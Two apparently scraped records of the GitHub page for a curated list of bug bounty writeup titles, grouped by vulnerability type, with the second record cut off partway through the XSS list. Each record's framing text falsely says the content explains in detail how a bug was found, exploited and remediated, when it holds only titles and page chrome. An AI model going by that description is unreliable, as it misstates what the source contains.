{"source_url": "https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#denial-of-service-dos", "title": "GitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference", "friendly_explanation": "This is a bug bounty writeup from https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#denial-of-service-dos. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Spark New Build and deploy intelligent apps GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert devanshbatham / Awesome-Bugbounty-Writeups Public Notifications You must be signed in to change notification settings Fork 1.1k Star 5.3k A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference 5.3k stars 1.1k forks Branches Tags Activity Star Notifications You must be signed in to change notification settings Code Issues 8 Pull requests 2 Actions Projects 0 Security Uh oh! There was an error while loading. Please reload this page . Insights Additional navigation options Code Issues Pull requests Actions Projects Security Insights devanshbatham/Awesome-Bugbounty-Writeups master Branches Tags Go to file Code Open more actions menu Folders and files Name Name Last commit message Last commit date Latest commit History 59 Commits static static README.md README.md View all files Repository files navigation README Contents Cross Site Scripting (XSS) Cross Site Request Forgery (CSRF) Clickjacking (UI Redressing Attack) Local File Inclusion (LFI) Subdomain Takeover Denial of Service (DOS) Authentication Bypass SQL injection Insecure Direct Object Reference (IDOR) 2FA Related issues CORS Related issues Server Side Request Forgery (SSRF) Race Condition Remote Code Execution (RCE) Android Pentesting Contributing Maintainers Cross Site Scripting (XSS) From P5 to P2 to 100 BXSS Google Acquisition XSS (Apigee) XSS on Microsoft.com via Angular Js template injection Researching Polymorphic Images for XSS on Google Scholar Netflix Party Simple XSS Stored XSS in google nest Self XSS to persistent XSS on login portal Universal XSS affecting Firefox XSS WAF Character limitation bypass like a boss Self XSS to Account Takeover Reflected XSS on Microsoft subdomains The tricky XSS Reflected XSS in AT&T XSS on Google using Acunetix Exploiting websocket application wide XSS Reflected XSS with HTTP Smuggling XSS on Facebook instagram CDN server bypassing signature protection XSS on Facebook's Acquisition Oculus XSS on sony Subdomain Exploiting Self XSS Effortlessly Finding Cross Site Scripting inclusion XSSI Bugbounty a DOM XSS Blind XSS : a mind Game FireFox IOS QR code reader XSS(CVE-2019-17003) HTML injection to XSS CVE-2020-13487 | Authenticated Stored Cross-site Scripting in bbPress XSS at error page of repository code XSS like a Pro How I turned self XSS to stored XSS via CSRF XSS Stored on Outlook web XSS Bug 20 Chars Blind XSS Payload XSS in AMP4EMAIL(DOM clobbering) DOM Based XSS bug bounty writeup XSS will never die 5000 USD XSS issue at avast desktop antivirus XSS to account takeover How Paypal helped me to generate XSS Bypass Uppercase filters like a PRO(XSS advanced methods) Stealing login credentials with reflected XSS bughunting xss on cookie popup warning XSS is love Oneplus XSS vulnerability in customer support portal Exploiting cookie based XSS by finding RCE Stored XSS on zendesk via macros XSS in ZOHO main DOM based XSS in private program Bugbounty writeup : Take Attention and get stored XSSS How I xssed admin account Clickjacking XSS on google Stored XSS on laporbugid Leveraging angularjs based XSS to privilege escalation How I found XSS by searching in shodan Chaining caache poisining to stored XSS XSS to RCE XSS on twitter worth 1120 Reflected XSS in ebay.com Cookie based XSS exolpoitation 2300 bug bounty What do netcat -SMTP-self XSS have in common XSS on google custom search engine Story of a Full Account Takeover vulnerability N/A to Accepted Yeah I got p2 in 1 minute stored XSS via markdown editor Stored XSS on indeed Self XSS to evil XSS How a classical XSS can lead to persistent ATO vulnerability Reflected XSS in tokopedia train ticket Bypassing XSS filter and stealing user credit card data Googleplex.com blind XSS Reflected XSS on error page How I was able to get private ticket response panel and fortigate web panel via blind XSS Unicode vs WAF Story of URI based XSS with some simple google dorking Stored XSS on edmodo XSSed my way to 1000 Try harder for XSS From parameter pollution to XSS MIME sniffing XSS Stored XSS on techprofile Microsoft Tale of a wormable Twitter XSS XSS attacks google bot index manipulation From Reflected XSS to Account takeover Stealing local storage data through XSS CSRF attack can lead to stored XSS XSS Reflected (filter bypass) XSS protection bypass on hackerone private program Just 5 minutes to get my 2nd Stored XSS on edmodo.com Multiple XSS in skype.com Obtaining XSS using moodle featured and minor bugs XSS on 403 forbidden bypass akamai WAF How I was turn self XSS into reflected XSS A Tale of 3 XSS Stored XSS on Google.com Stored XSS in the Guides gameplaersion (www.dota2.com) Admin google.com reflected XSS Paypal Stored security bypass Paypal DOM XSS main domain Bugbounty : The 5k$ Google XSS Facebook stored XSS Ebay mobile reflected XSS Magix bugbounty XSS writeup Abusing CORS for an XSS on flickr XSS on google groups Oracle XSS Content types and XSS Facebook Studio Admob Creative image XSS Amazon Packaging feedback XSS PaypalTech XSS Persistent XSS on my world Google VRP XSS in device management Google VRP XSS Google VRP Blind XSS WAZE XSS Referer Based XSS How we invented the Tesla DOM XSS Stored XSS on rockstar game How I was able to bypass strong XSS protection in well known website imgur.com Self XSS to Good XSS That escalated quickly : from partial CSRF to reflected XSS to complete CSRF to Stored XSS XSS using dynamically generated js file Bypassing XSS filtering at anchor Tags XSS by tossing cookies Coinbase angularjs dom XSS via kiteworks Medium Content spoofing and XSS Managed Apps and music a tale of two XSSes in Google play Making an XSS triggered by CSP bypass on twitter Escalating XSS in phantomjs image rendering to SSRF Reflected XSS in Simplerisk Stored XSS in the heart of the russian email provider How I built an XSS worm on atmail XSS on bugcrowd and so many other websites main domain Godaddy XSS affects parked domains redirector Processor Stored XSS in Google image search A pair of plotly bugs stored XSS abd AWS metadata Near universal XSS in mcafee web gateway Penetrating Pornhub XSS vulns How I found a 5000 Google maps XSS by fiddling with protobuf Airbnb when bypassing json encoding XSS filter WAF CSP and auditior turns into eight vulnerabilities Lightwight markup a trio of persistent XSS in gitlab XSS ONE BAY SVG XSS in unifi Stored XSS in unifi V4.8.12 controller Turning self XSS into good XSS v2 SWF XSS DOM Based XSS XSS filter bypass in Yahoo Dev flurry XSS on Flickr Two vulnerabilities makes an exploit XSS and csrf in bing Runkeeper stored XSS Google sleeping XSS awakens 5k bounty Poisoning the well compromising godaddy customer support with blind XSS UBER turning self XSS to good XSS XSS on facebook via png content types Cloudflare XSS How I found XSS Vulnerability in Google XSS to RCE One payload to XSS them all Self XSS on komunitas Reclected XSS on alibabacloud Self XSS on komunitas bukalapak A real XSS in OLX Self XSS using IE adobes Stealing local storage through XSS 1000 USD in 5mins Stored XSS in Outlook OLX reflected XSS My first stored XSS on edmodo.com Hack your form new vector for BXSS How I found Blind XSS vulnerability in redacted.com 3 XSS in protonmail for iOS XSS in edmodo wihinin 5 mins Stil work redirect Yahoo subdomain XSS XSS in azure devOps Shopify reflected XSS Muliple Stored XSS on tokopedia Stored XSS on edmodo A unique XSS scenario 1000 Bounty Protonmail XSS Stored Chaining tricky ouath exploitation to stored XSS Antihack XSS to php uplaod Reflected XSS in zomato XSS through SWF file Hackyourform BXSS Reflected XSS on ASUS Stored XSS via Alternate text at zendesk support How I stumbled upon a stored XSS : my first bug bounty story Cookie based Self XSS to Good XSS Reflected XSS on amazon XSS worm : a creative use of web application vulnerability Google code in XSS Self XSS on indeed.com How I accidentally found XSS in Protonmail for iOS app XML XSS in yandex.ru by accident Critical Stored XSS vulnerability XSS bypass using META tag in realestate.postnl.nl Edmodo XSS bug XSS in hiden input fields How I discovered XSS that affected over 20 uber subdomains DOM based XSS or why you should not rely on cloudflare too much XSS in dynamics 365 XSS deface with html and how to convert the html into charcode Cookie based injection XSS making explitable with exploiting other vulns XSS with put in ghost blog XSS using a Bug in safari and why blacklists are stupid Magic XSS with two parameters DOM XSS bug affecting tinder shopify Yelp Persistent XSS unvalidated open graph embed at linkedin.com My first 0day exploit CSP Bypass Reflected XSS Google Stored XSS in payments XSS on dropbox Weaponizing XSS attacking internal domains How I XSSed UBER and bypassed CSP RXSS and CSRF bypass to Account takeover Another XSS in google collaboratory How I bypassed AKAMAI waf in overstock.com Reflected XSS at philips.com XSS vulnerabilities in multiple iframe busters affecting top tier sites Reflected DOM XSS and clickjacking silvergoldbull Stored XSS vulnerability in h1 private Authbypass SQLi and XSS Stored XSS vulnerability in tumblr XSS in google code jam Mapbox XSS My first valid XSS Stored XSS in webcomponents.org 3 minutes XSS icloud.com DOM based XSS XSS at hubspot and in email areas Self XSS leads to blind XSS and Reflected XSS Refltected XSS primagames.com Stored XSS in gameskinny Blind XSS in Chrome experments Google Yahoo two XSSI vulnerabilities chained to steal user information (750$) How I found XSS on amazon A blind XSS in messengers twins XSS in microsoft Subdomain Persistent XSS at ah.nl The 12000 intersection betwenn clickjaking , XSS and DOS XSS in google collaboratory CSP bypass How I found blind XSS in apple Reflected XSS on amazon.com How I found XSS in 360totalsecurity The 2.5 BTC Stored XSS XSS Vulnerability in Netflix A story of a UXSS via DOM XSS clickjacking in steam inventory helper How I found XSS via SSRF vulnerability Searching for XSS found ldap injection how I converted SSRF to XSS in a SSRF vulnerable JIRA Reflected XSS in Yahoo subdomain Account takeover and blind XSS How I found 5 stored XSS on a private program Persistent XSS to steal passwords(Paypal) Self XSS + CSRF to stored XSS Stored XSS in yahoo and subdomains XSS in microsoft Blind XSS at customer support panel Reflected XSS on stackoverflow Stored XSS in Yahoo XSS 403 forbidden Bypass Turning self XSS into non self XSS via authorization issue at paypal A story of stored XSS bypass Mangobaaz hacked XSS to credentials How I got stored XSS using file upload Bypassing CSP to abusing XSS filter in edge XSS to session Hijacking Reflected XSS on www.zomato.com XSS in subdomain of yahoo XSS in yahoo.net subdomain Reflected XSS moongaloop swf version 62x Google adwords 3133.7 Stored XSS How I found a surprising XSS vulnerability on oracle netsuite Stored XSS on snapchat How I was able to bypass XSS protection on h1 private program Reflected XSS possible XSS via angularjs template injection hostinger Microsoft follow feature XSS (CVE-2017-8514) XSS protection bypass made my quickest bounty ever Taking note XSS to RCE in the simplenote electron client VMWARE official vcdx reflected XSS How I pwned a company using IDOR and Blind XSS From Recon to DOM based XSS Local file read via XSS Non persistent XSS at microsoft A Stored XSS in google (double kill) Filter bypass to Reflected XSS on finance.yahoo.com (mobile version) 900$ XSS in yahoo : recon wins How I bypassed practos firewall and triggered an XSS vulnerability Stored XSS to full information disclosure Story of parameter specific XSS Chaining self XSS with UI redressing leading to session hijacking Stored XSS with arbitrary cookie installation Reflective XSS and Open redirect on indeed.com subdomain How I found reflected XSS on Yahoo subdomain Dont just alert(1) because XSS is more fun UBER XSS by helpe of KNOXSS Reflected XSS in Yahoo Reflected XSS on ww.yahoo.com XSS because of wrong content type header Cross Site Request Forgery (CSRF) How a simple CSRF attack turned into a P1 How I exploited the json csrf with method override technique How I found CSRF(my first bounty) Exploiting websocket application wide XSS and CSRF Site wide CSRF on popular program Using CSRF I got weird account takeover CSRF CSRF CSRF Google Bugbounty CSRF in learndigital.withgoogle.com CSRF token bypass [a tale of 2k bug] 2FA bypass via CSRF attack Stored iframe injection CSRF account takeover Instagram delete media CSRF An inconsistent CSRF Bypass CSRF with clickjacking worth 1250 Sitewide CSRF graphql Account takeover using CSRF json based CORS to CSRF attack My first CSRF to account takeover 4x chained CSRFs chained for account takeover CSRF can lead to stored XSS Yet other examples of abusing CSRF in logout Wordpress CSRF to RCE Bruteforce user IDs via CSRF to delete all the users with CSRF attack CSRF Bypass using cross frame scripting Account takeover via CSRF A very useful technique to bypass the CSRF protection CSRF account takeover exlpained automated manual bugbounty CSRF to account takeover How I got 500USD from microsoft for CSRF vulnerability Critical Bypass CSRF protection RXSS CSRF bypass to full account takeover Youtube CSRF Self XSS + CSRF = Stored XSS Ribose IDOR with simple CSRF bypass unrestrcited changes and deletion to other photo profile JSON CSRF attack on a social networking site Hacking facebook oculus integration CSRF Amazon leaking CSRF token using service worker Facebook graphql CSRF Chain the vulnerabilities and take your report impact on the moon csrf to html injection Partial CSRF to Full CSRF Stealing access token of one drive integration by chain csrf vulnerability Metasploit web project kill all running taks CSRF CVE-2017-5244 Messenger site wide CSRF Hacking Facebook CSRF device login flow Two vulnerabilities makes an exploit XSS and CSRF in bing How I bypassed Facebook in 2016 Ubiquiti bugbounty unifi generic CSRF protection Bypass Bypass Facebook CSRF Facebook CSRF full account takeover Clickjacking (UI redressing attack) Google Bug bounty Clickjacking on Google payment Google APIs Clickjacking worth 1337$ Clickjacking + XSS on Google org Bypass CSRF with clickjacking on Google org 1800 worth Clickjacking Account takeover with clickjacking Clickjacking on google CSE How I accidentally found clickjacking in Facebook Clickjacking on google myaccount worth 7500 Clickjacking in google docs and void typing feature Reflected DOM XSS and Clickjacking binary.com clickjacking vulnerability exploiting HTML5 security features 12000 intersection betwen clickjacking XSS and denial of service Steam fire and paste : a story of uxss via DOM XSS and Clickjacking in steam inventory helper Yet another Google Clickjacking Redressing instagram leaking application tokens via instagram clickjacking vulnerability Self XSS to Good XSS and Clickjacking Microsoft Yammer clickjacking exploiting HTML5 security features Firefox find my device clickjacking Whatsapp Clickjacking vulnerability Telegram WEB client clickjacking vulnerability Facebook Clickjacking : how we put a new dress on facebook UI Local File Inclusion (LFI) RFI LFI Writeup My first LFI Bug bounty LFI at Google.com Google LFI on production servers in redacted.google.com LFI to 10 server pwn LFI in apigee portals Chain the bugs to pwn an organisation LFI unrestricted file upload to RCE How we got LFI in apache drill recom like a boss Bugbounty journey from LFI to RCE LFI to RCE on deutche telekom bugbounty From LFI to RCE via PHP sessions magix bugbounty magix.com XSS RCE SQLI and LFI LFI in nokia maps Subdomain Takeover How I bought my way to subdomain takeover on tokopedia Subdomain Takeover via pantheon Subdomain takeover : a unique way Escalating subdomain takeover to steal sensitive stuff Subdomain takeover awarded 200 Subdomain takeover via wufoo service Subdomain takeover via Hubspot Souq.com subdomain takeover Subdomain takeover : new level Subdomain takeover due to misconfigured project settings for custom domain Subdomain takeover via shopify vendor Subdomain takeover via unsecured s3 bucket Subdomain takeover worth 200 Subdomain takeover via campaignmonitor How to do 55000 subdomain takeover in a blink of an eye Subdomain takeover Starbucks (Part 2) Subdomain takeover Starbucks Uber wildcard subdomain takeover Bugcrowd domain subdomain takeover vulnerability Subdomain takeover vulnerability (Lamborghini Hacked) Authentication bypass on uber's SSO via subdomain takeover Authentication bypass on SSO ubnt.com via Subdomain takeover of ping.ubnt.com Denial of Service (DOS) Long String DOS AIRDOS Denial of Service DOS vulnerability in script loader (CVE-2018-6389) Github actions DOS Application level denial of service Banner grabbing to DOS and memory corruption DOS across Facebook endpoints DOS on WAF protected sites DOS on Facebook android app using zero width no break characters Whatsapp DOS vulnerability on android and iOS Whatsapp DOS vulnerability in iOS android Authentication Bypass Touch ID authentication Bypass on evernote and dropbox iOS apps Oauth authentication bypass on airbnb acquistion using wierd 1 char open redirect Two factor authentication bypass Instagram multi factor authentication bypass Authentication bypass in nodejs application Symantec authentication Bypass Authentication bypass in CISCO meraki Slack SAML authentocation bypass Authentication bypass on UBER's SSO Authentication Bypass on airbnb via oauth tokens theft Inspect element leads to stripe account lockout authentication Bypass Authentication bypass on SSO ubnt.com SQL Injection(SQLI) Tricky oracle SQLI situation Exploiting “Google BigQuery” SQLI SQLI via stopping the redirection to a login page Finding SQLI with white box analysis a recent bug example Bypassing a crappy WAF to exploit a blind SQLI SQL Injection in private-site.com/login.php Exploiting tricky blind SQLI SQLI in forget password fucntion SQLI Bug Bounty File Upload blind SQLI SQL Injection SQLI through User Agent SQLI in insert update query without comma SQLI for 50 bounty Abusing MYSQL CLients SQLI Authentication Bypass AutoTrader Webmail ZOL Zimbabwe Authentication Bypass to XSS & SQLi SQLI bootcamp.nutanix.com SQLI in University of Cambridge Making a blind SQLI a little less Blind SQLI SQLI amd silly WAF Attacking Postgresql Database Bypassing Host Header to SQL injection to dumping Database — An unusual case of SQL injection A 5 minute SQLI Union based SQLI writeup SQLI with load file and into outfile SQLI is Everywhere SQLI in Update Query Bug Blind SQLI Hootsuite Yahoo – Root Access SQLI – tw.yahoo.com Step by Step Exploiting SQLI in Oculus Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) Tesla Motors blind SQLI SQLI in Nokia Sites Insecure Direct Object Reference (IDOR) Disclose Private Dashboard Chart's name and data in Facebook Analytics Disclosing privately shared gaming clips of any user Adding anyone including non-friend and blocked people as co-host in personal event! Page analyst could view job application details Deleting Anyone's Video Poll 2FA related issues 2FA Bypass via logical rate limiting Bypass Bypass 2FA in a website Weird and simple 2FA bypass How I cracked 2FA with simple factor bruteforce Instagram account is reactivated without entering 2FA How to bypass 2FA with a HTTP header How I hacked 40k user accounts of microsoft using 2FA bypass outlook How I abused 2FA to maintain persistence after password recovery change google microsoft instragram Bypass hackerone 2FA Facebook Bug bounty : How I was able to enumerate instagram accounts who had enabled 2FA CORS related issues CORS bug on google's 404 page (rewarded) CORS misconfiguration leading to private information disclosure CORS misconfiguration account takeover out of scope to grab items in scope Chrome CORS Bypassing CORS CORS to CSRF attack An unexploited CORS misconfiguration reflecting further issues Think outside the scope advanced cors exploitation techniques A simple CORS misconfiguration leaked private post of twitter facebook instagram Explpoiting CORS misconfiguration Full account takeover through CORS with connection sockets Exploiting insecure CORS API api.artsy.net Pre domain wildcard CORS exploitation Exploiting misconfigured CORS on popular BTC site Abusing CORS for an XSS on flickr Server Side Request Forgery (SSRF) Exploiting an SSRF trials and tribulations SSRF on PDF generator Google VRP SSRF in Google cloud platform stackdriver Vimeo upload function SSRF SSRF via ffmeg processing My first SSRF using DNS rebinding Bugbounty simple SSRF SSRF reading local files from downnotifier server SSRF vulnerability Gain adfly SMTP access with SSRF via gopher protocol Blind SSRF in stripe.com due to senntry misconfiguration SSRF port issue hidden approch The jorney of web cache firewall bypass to SSRF to AWS credentials compromise SSRF to local file read and abusing aws metadata pdfreactor SSRF to root level local files read which lead to RCE SSRF trick : SSRF XSPA in micosoft's bing webwaster Downnotifeer SSRF Escalating SSRF to RCE Vimeo SSRF with code execution potential SSRF in slack Exploiting SSRF like a boss AWS takeover SSRF javascript Into the borg of SSRF inside google production network SSRF to local file disclosure How I found an SSRF in yahoo guesthouse (recon wins) Reading internal files using SSRF vulnerability Airbnb chaining third party open redirect into SSRF via liveperson chat Race Condition Exploiting a Race condition vulnerabililty Race condition that could result to RCE a story with an app Creating thinking is our everything : Race condition and business logic Chaining improper authorization to Race condition to harvest credit card details A Race condition bug in Facebook chat groups Race condition bypassing team limit Race condition on web Race condition bugs on Facebook Hacking Banks With Race Conditions Race Condition Bug In Web App: A Use Case RACE Condition vulnerability found in bug-bounty program How to check Race Conditions in Web Applications Remote Code Execution (RCE) Microsoft RCE bugbounty OTP bruteforce account takeover Attacking helpdesk RCE chain on deskpro with bitdefender Remote image upload leads to RCE inject malicious code Finding a p1 in one minute with shodan.io RCE From recon to optimizing RCE results simple story with one of the biggest ICT company Uploading backdoor for fun and profit RCE DB creds P1 Responsible Disclosure breaking out of a sandboxed editor to perform RCE Wordpress design flaw leads to woocommerce RCE Path traversal while uploading results in RCE RCE jenkins instance Traversing the path to RCE How I chained 4 bugs features into RCE on amazon RCE due to showexceptions Yahoo luminate RCE Latex to RCE private bug bounty program How I got hall of fame in two fortune 500 companies an RCE story RCE by uploading a web config 36k Google app engine RCE How I found 2.9 RCE at yahoo Bypass firewall to get RCE RCE vulnerabilite in yahoo subdomain RCE in duolingos tinycards app from android Unrestricted file upload to RCE Getting a RCE (CTF WAY) RCE starwars How I got 5500 from yahoo for RCE RCE in Addthis Paypal RCE My First RCE (Stressed Employee gets me 2x bounty) Abusing ImageMagick to obtain RCE How Snapdeal Kept their Users Data at Risk! RCE via ImageTragick How I Cracked 2FA with Simple Factor Brute-force! Found RCE but got Duplicated “Recon” helped Samsung protect their production repositories of SamsungTv, eCommerce eStores IDOR to RCE RCE on AEM instance without JAVA knowledge RCE with Flask Jinja tempelate Injection Race Condition that could result to RCE Chaining Two 0-Days to Compromise An Uber Wordpress Oculus Identity Verification bypass through Brute Force Used RCE as Root on marathon Instance Two easy RCE in Atlassian Products RCE in Ruby using mustache templates About a Sucuri RCE…and How Not to Handle Bug Bounty Reports Source code disclosure vulnerability Bypassing custom Token Authentication in a Mobile App Facebook’s Burglary Shopping List From SSRF To RCE in PDFReacter Apache strust RCE Dell KACE K1000 Remote Code Execution Handlebars Tempelate Injection and RCE Leaked Salesforce API access token at IKEA.com Zero Day RCE on Mozilla's AWS Network Escalating SSRF to RCE Fixed : Brute-force Instagram account’s passwords Bug Bounty 101 — Always Check The Source Code ASUS RCE vulnerability on rma.asus-europe.eu Magento – RCE & Local File Read with low privilege admin rights RCE in Nokia.com Two RCE in SharePoint Token Brute-Force to Account Take-over to Privilege Escalation to Organization Take-Over RCE in Hubspot with EL injection in HubL Github Desktop RCE eBay Source Code leak Facebook source code disclosure in ads API XS-Searching Google’s bug tracker to find out vulnerable source code Buffer Overflow Writeups Buffer Overflow Attack Book pdf Github Repository on Buffer Overflow Attack Stack-Based Buffer Overflow Attacks: Explained and Examples How Buffer Overflow Attacks Work Binary Exploitation: Buffer Overflows WHAT IS A BUFFER OVERFLOW? LEARN ABOUT BUFFER OVERRUN VULNERABILITIES, EXPLOITS & ATTACKS Android Pentesting Android Pentesting Lab (Step by Step guide for beginners!) Contributing Open Pull Requests Send me links of writeups to My Twitter : 0xAsm0d3us Maintainers This Repo is maintained by : devanshbatham e13v3n-0xb About A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Topics bugbounty bughunting bugbountytips bugbounty-writeups security-writeups bugbounty-blogs bugbounty-yahoo bugbounty-facebook bughunting-methodology bughunting-writeups Resources Readme Uh oh! There was an error while loading. Please reload this page . Activity Stars 5.3k stars Watchers 248 watching Forks 1.1k forks Report repository Releases No releases published Packages 0 No packages published Uh oh! There was an error while loading. Please reload this page . Contributors 8 Languages Python 100.0% Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time."}
{"source_url": "https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#authentication-bypass", "title": "GitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference", "friendly_explanation": "This is a bug bounty writeup from https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#authentication-bypass. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Spark New Build and deploy intelligent apps GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert devanshbatham / Awesome-Bugbounty-Writeups Public Notifications You must be signed in to change notification settings Fork 1.1k Star 5.3k A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference 5.3k stars 1.1k forks Branches Tags Activity Star Notifications You must be signed in to change notification settings Code Issues 8 Pull requests 2 Actions Projects 0 Security Uh oh! There was an error while loading. Please reload this page . Insights Additional navigation options Code Issues Pull requests Actions Projects Security Insights devanshbatham/Awesome-Bugbounty-Writeups master Branches Tags Go to file Code Open more actions menu Folders and files Name Name Last commit message Last commit date Latest commit History 59 Commits static static README.md README.md View all files Repository files navigation README Contents Cross Site Scripting (XSS) Cross Site Request Forgery (CSRF) Clickjacking (UI Redressing Attack) Local File Inclusion (LFI) Subdomain Takeover Denial of Service (DOS) Authentication Bypass SQL injection Insecure Direct Object Reference (IDOR) 2FA Related issues CORS Related issues Server Side Request Forgery (SSRF) Race Condition Remote Code Execution (RCE) Android Pentesting Contributing Maintainers Cross Site Scripting (XSS) From P5 to P2 to 100 BXSS Google Acquisition XSS (Apigee) XSS on Microsoft.com via Angular Js template injection Researching Polymorphic Images for XSS on Google Scholar Netflix Party Simple XSS Stored XSS in google nest Self XSS to persistent XSS on login portal Universal XSS affecting Firefox XSS WAF Character limitation bypass like a boss Self XSS to Account Takeover Reflected XSS on Microsoft subdomains The tricky XSS Reflected XSS in AT&T XSS on Google using Acunetix Exploiting websocket application wide XSS Reflected XSS with HTTP Smuggling XSS on Facebook instagram CDN server bypassing signature protection XSS on Facebook's Acquisition Oculus XSS on sony Subdomain Exploiting Self XSS Effortlessly Finding Cross Site Scripting inclusion XSSI Bugbounty a DOM XSS Blind XSS : a mind Game FireFox IOS QR code reader XSS(CVE-2019-17003) HTML injection to XSS CVE-2020-13487 | Authenticated Stored Cross-site Scripting in bbPress XSS at error page of repository code XSS like a Pro How I turned self XSS to stored XSS via CSRF XSS Stored on Outlook web XSS Bug 20 Chars Blind XSS Payload XSS in AMP4EMAIL(DOM clobbering) DOM Based XSS bug bounty writeup XSS will never die 5000 USD XSS issue at avast desktop antivirus XSS to account takeover How Paypal helped me to generate XSS Bypass Uppercase filters like a PRO(XSS advanced methods) Stealing login credentials with reflected XSS bughunting xss on cookie popup warning XSS is love Oneplus XSS vulnerability in customer support portal Exploiting cookie based XSS by finding RCE Stored XSS on zendesk via macros XSS in ZOHO main DOM based XSS in private program Bugbounty writeup : Take Attention and get stored XSSS How I xssed admin account Clickjacking XSS on google Stored XSS on laporbugid Leveraging angularjs based XSS to privilege escalation How I found XSS by searching in shodan Chaining caache poisining to stored XSS XSS to RCE XSS on twitter worth 1120 Reflected XSS in ebay.com Cookie based XSS exolpoitation 2300 bug bounty What do netcat -SMTP-self XSS have in common XSS on google custom search engine Story of a Full Account Takeover vulnerability N/A to Accepted Yeah I got p2 in 1 minute stored XSS via markdown editor Stored XSS on indeed Self XSS to evil XSS How a classical XSS can lead to persistent ATO vulnerability Reflected XSS in tokopedia train ticket Bypassing XSS filter and stealing user credit card data Googleplex.com blind XSS Reflected XSS on error page How I was able to get private ticket response panel and fortigate web panel via blind XSS Unicode vs WAF Story of URI based XSS with some simple google dorking Stored XSS on edmodo XSSed my way to 1000 Try harder for XSS From parameter pollution to XSS MIME sniffing XSS Stored XSS on techprofile Microsoft Tale of a wormable Twitter XSS XSS attacks google bot index manipulation From Reflected XSS to Account takeover Stealing local storage data through XSS CSRF attack can lead to stored XSS XSS Reflected (filter bypass) XSS protection bypass on hackerone private program Just 5 minutes to get my 2nd Stored XSS on edmodo.com Multiple XSS in skype.com Obtaining XSS using moodle featured and minor bugs XSS on 403 forbidden bypass akamai WAF How I was turn self XSS into reflected XSS A Tale of 3 XSS Stored XSS on Google.com Stored XSS in the Guides gameplaersion (www.dota2.com) Admin google.com reflected XSS Paypal Stored security bypass Paypal DOM XSS main domain Bugbounty : The 5k$ Google XSS Facebook stored XSS Ebay mobile reflected XSS Magix bugbounty XSS writeup Abusing CORS for an XSS on flickr XSS on google groups Oracle XSS Content types and XSS Facebook Studio Admob Creative image XSS Amazon Packaging feedback XSS PaypalTech XSS Persistent XSS on my world Google VRP XSS in device management Google VRP XSS Google VRP Blind XSS WAZE XSS Referer Based XSS How we invented the Tesla DOM XSS Stored XSS on rockstar game How I was able to bypass strong XSS protection in well known website imgur.com Self XSS to Good XSS That escalated quickly : from partial CSRF to reflected XSS to complete CSRF to Stored XSS XSS using dynamically generated js file Bypassing XSS filtering at anchor Tags XSS by tossing cookies Coinbase angularjs dom XSS via kiteworks 